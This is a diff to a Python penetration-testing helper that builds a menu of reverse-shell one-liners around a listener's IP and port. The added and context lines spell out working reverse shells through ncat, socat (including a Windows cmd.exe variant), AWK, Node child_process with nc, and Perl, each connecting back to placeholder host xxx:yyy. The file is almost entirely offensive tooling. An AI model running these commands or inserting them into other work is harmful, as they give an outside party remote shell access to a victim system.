@@ -81,7 +81,9 @@ def ask_listener() -> (str, int, bool):
         ip_addrs.extend(
             [
                 ip_addr["addr"]
-                for ip_addr in netifaces.ifaddresses(interface).get(netifaces.AF_INET, [])
+                for ip_addr in netifaces.ifaddresses(interface).get(
+                    netifaces.AF_INET, []
+                )
                 if not ipaddress.ip_address(ip_addr["addr"]).is_loopback
             ]
         )
@@ -189,7 +191,33 @@ def shell(listener: str):
 ╠═══════════════════════════════════════════════════
 ║ ncat --udp xxx yyy -e /bin/bash
 ╚═══════════════════════════════════════════════════
-
+""")
+    if rlwrap:
+        shells.append(windows_color)
+    shells.append(r"""
+╔Socat══════════════════════════════════════════════""")
+    if not rlwrap:
+        shells.append(r"""
+║ socat -d -d -d TCP4:xxx:yyy EXEC:/bin/bash""")
+        if pwncat:
+            shells.append(
+            """
+╚═══════════════════════════════════════════════════
+""")
+    if not pwncat:
+        shells.append(windows_color)
+        if not rlwrap:
+            shells.append("""
+╠═══════════════════════════════════════════════════""")
+        shells.append(
+            r"""
+║ Windows only ║ socat -d -d TCP4:xxx:yyy EXEC:'cmd.exe',pipes
+╚══════════════╩════════════════════════════════════
+""")
+    if not rlwrap:
+        shells.append(linux_color)
+        shells.append(
+            r"""
 ╔AWK════════════════════════════════════════════════
 ║ awk 'BEGIN {s = "/inet/tcp/0/xxx/yyy"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ╚═══════════════════════════════════════════════════
@@ -224,7 +252,8 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
 ╠═══════════════════════════════════════════════════"""
         )
     else:
-        shells.append("""╔PERL═══════════════════════════════════════════════""")
+        shells.append("""
+╔PERL═══════════════════════════════════════════════""")
     shells.append(
         r"""
 ║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
